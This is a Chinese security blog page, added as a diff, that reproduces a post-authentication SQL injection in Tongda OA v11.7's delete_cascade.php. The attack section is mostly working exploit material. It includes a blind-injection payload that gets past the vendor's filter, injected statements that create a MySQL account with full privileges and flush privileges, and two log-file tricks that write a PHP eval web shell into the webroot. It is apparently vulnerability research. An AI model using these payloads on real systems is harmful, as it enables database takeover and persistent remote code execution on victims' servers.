@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>通达OA v11.7 delete_cascade.php 后台SQL注入 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="通达OA v11.7 delete_cascade.php 后台SQL注入" />
+<meta property="og:description" content="通达OA v11.7 delete_cascade.php 后台SQL注入 漏洞描述 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器 漏洞影响 1 通达OA v11.7 环境搭" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="通达OA v11.7 delete_cascade.php 后台SQL注入"/>
+<meta name="twitter:description" content="通达OA v11.7 delete_cascade.php 后台SQL注入 漏洞描述 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器 漏洞影响 1 通达OA v11.7 环境搭"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" /><link rel="prev" href="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "通达OA v11.7 delete_cascade.php 后台SQL注入",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  899 ,
+        "url": "http:\/\/example.org\/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">通达OA v11.7 delete_cascade.php 后台SQL注入</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;899 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="通达oa-v117-delete_cascadephp-后台sql注入">通达OA v11.7 delete_cascade.php 后台SQL注入</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">通达OA v11.7
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="环境搭建">环境搭建</h2>
+<p><a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe" target="_blank" rel="noopener noreffer">环境地址</a>
+</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>在 <strong>general/hr/manage/query/delete_cascade.php</strong> 文件中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091108270.png"
+        data-srcset="/images/202202091108270.png, /images/202202091108270.png 1.5x, /images/202202091108270.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091108270.png"
+        title="image-20220209110843192" /></p>
+<p>首先判断<code>$condition_cascade</code>是否为空，如果不为空，则将其中的<code>\'</code>替换为<code>'</code>。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用<code>addslashes</code>函数进行保护，如下：</p>
+<p><strong>inc/common.inc.php</strong> 代码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091108141.png"
+        data-srcset="/images/202202091108141.png, /images/202202091108141.png 1.5x, /images/202202091108141.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091108141.png"
+        title="image-20220209110858090" /></p>
+<p>使用盲注对SQL注入进行测试</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091109818.png"
+        data-srcset="/images/202202091109818.png, /images/202202091109818.png 1.5x, /images/202202091109818.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091109818.png"
+        title="image-20220209110914705" /></p>
+<p>触发了通达OA的SQL注入拦截</p>
+<p><strong>inc/conn.php</strong>文件中找到过滤机制如下:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091109512.png"
+        data-srcset="/images/202202091109512.png, /images/202202091109512.png 1.5x, /images/202202091109512.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091109512.png"
+        title="image-20220209110944424" /></p>
+<p>其过滤了一些字符，但是并非无法绕过，盲注的核心是：<code>substr、if</code>等函数，均未被过滤，那么只要构造MySQL报错即可配合<code>if</code>函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现<code>power(9999,99)</code>也可以使数据库报错，所以构造语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="n">substr</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;r&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="n">power</span><span class="p">(</span><span class="mi">9999</span><span class="p">,</span><span class="mi">99</span><span class="p">))</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="err">当字符相等时，不报错，错误时报错</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091110796.png"
+        data-srcset="/images/202202091110796.png, /images/202202091110796.png 1.5x, /images/202202091110796.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091110796.png"
+        title="image-20220209111011701" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091110677.png"
+        data-srcset="/images/202202091110677.png, /images/202202091110677.png 1.5x, /images/202202091110677.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091110677.png"
+        title="image-20220209111026602" /></p>
+<p>添加SQL数据库用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">grant</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">privileges</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;peiqi&#39;</span><span class="o">@</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="n">IDENTIFIED</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="s1">&#39;peiqiABC@123&#39;</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="k">GRANT</span><span class="w"> </span><span class="k">OPTION</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问 **<a href="http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant" target="_blank" rel="noopener noreffer">http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant</a>
+ all privileges ON mysql. <em>TO &lsquo;peiqi&rsquo;@&rsquo;%&rsquo; IDENTIFIED BY &lsquo;peiqiABC@123&rsquo; WITH GRANT OPTION</em></p>
+<p>进入 <strong>Myoa/mysql5/bin</strong> 目录 执行 <strong>mysql -upeiqi -p</strong> 输入密码查询所有用户</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091110154.png"
+        data-srcset="/images/202202091110154.png, /images/202202091110154.png 1.5x, /images/202202091110154.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091110154.png"
+        title="image-20220209111049110" /></p>
+<p>发现成功执行添加一个账户</p>
+<p>然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="o">`</span><span class="n">mysql</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="k">user</span><span class="o">`</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="o">`</span><span class="n">Password</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Select_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Insert_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Update_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Delete_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Create_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Drop_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Reload_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Shutdown_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Process_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">File_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Grant_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">References_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Index_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Alter_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Show_db_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Super_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Create_tmp_table_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Lock_tables_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Execute_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Repl_slave_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Repl_client_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Create_view_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Show_view_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Create_routine_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Alter_routine_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Create_user_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Event_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Trigger_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">Create_tablespace_priv</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">ssl_type</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">ssl_cipher</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">x509_issuer</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">x509_subject</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">max_questions</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">max_updates</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">max_connections</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">max_user_connections</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">plugin</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;mysql_native_password&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">authentication_string</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">password_expired</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Y&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="o">`</span><span class="k">Host</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cast</span><span class="p">(</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">Binary</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="o">`</span><span class="k">User</span><span class="o">`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Cast</span><span class="p">(</span><span class="s1">&#39;peiqi&#39;</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">Binary</span><span class="p">(</span><span class="mi">5</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091111720.png"
+        data-srcset="/images/202202091111720.png, /images/202202091111720.png 1.5x, /images/202202091111720.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091111720.png"
+        title="image-20220209111109474" /></p>
+<p>然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：<code>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code>这样就拥有了所有权限</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091111343.png"
+        data-srcset="/images/202202091111343.png, /images/202202091111343.png 1.5x, /images/202202091111343.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091111343.png"
+        title="image-20220209111122226" /></p>
+<p>登录如果失败，执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">grant</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">privileges</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;peiqi&#39;</span><span class="o">@</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="n">IDENTIFIED</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="s1">&#39;peiqiABC@123&#39;</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="k">GRANT</span><span class="w"> </span><span class="k">OPTION</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用漏洞写shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="err">查路径：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">F</span><span class="p">:</span><span class="err">\</span><span class="n">OA</span><span class="err">\</span><span class="n">mysql5</span><span class="err">\，那么</span><span class="n">web目录就是</span><span class="w"> </span><span class="n">F</span><span class="p">:</span><span class="o">/</span><span class="n">OA</span><span class="o">/</span><span class="n">webroot</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">方法</span><span class="mi">1</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">slow_query_log</span><span class="o">=</span><span class="k">on</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">slow_query_log_file</span><span class="o">=</span><span class="s1">&#39;F:/OA/webroot/&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php eval($_POST[x]);?&gt;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="mi">11</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">方法</span><span class="mi">2</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">on</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;F:/OA/webroot/&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php eval($_POST[x]);?&gt;&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%general%&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传大马</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202091111491.png"
+        data-srcset="/images/202202091111491.png, /images/202202091111491.png 1.5x, /images/202202091111491.png 2x"
+        data-sizes="auto"
+        alt="/images/202202091111491.png"
+        title="image-20220209111135417" /></p>
+<h2 id="参考文章">参考文章</h2>
